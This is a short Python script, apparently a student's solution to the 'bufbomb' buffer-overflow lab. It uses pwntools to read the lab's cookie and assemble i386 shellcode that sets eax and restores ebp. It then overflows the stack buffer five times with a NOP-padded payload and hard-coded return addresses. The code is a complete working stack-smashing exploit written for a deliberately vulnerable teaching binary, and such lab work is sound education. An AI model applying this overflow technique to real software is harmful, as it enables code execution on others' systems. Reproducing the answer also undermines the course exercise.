from pwn import *
import re

context(os = 'linux', arch = 'i386', log_level = 'debug')

sh = process(["./bufbomb", "-n", "-u", "xlj"])

Cookie = sh.recvline()
Cookie = sh.recvline()
Cookie = re.findall("Cookie: (.+?)\n", Cookie)[0]
Cookie = int(Cookie, 16)

stack = [0x55683888, 0x55683828, 0x55683858, 0x556838a8, 0x55683828]
last_ebp = [0x55683ac0, 0x55683a60, 0x55683a90, 0x55683ae0, 0x55683a60]
Ad_AfterGets = 0x08048E3A
stack_len = 0x20c

for i in range(5):
	#gdb.attach(sh, "b* 0x8049229")
	shellcode = '''
	mov eax, %d;
	push %d;
	pop ebp;
	push %d;
	ret;
	''' % (Cookie, last_ebp[i], Ad_AfterGets)

	shellcode = asm(shellcode)
	payload = shellcode + '\x90' * (stack_len - len(shellcode)) + p32(stack[i])
	sh.sendline(payload)
	if i != 4:
		print(sh.recvuntil("Type string:"))
	else:
		print(sh.recvall())
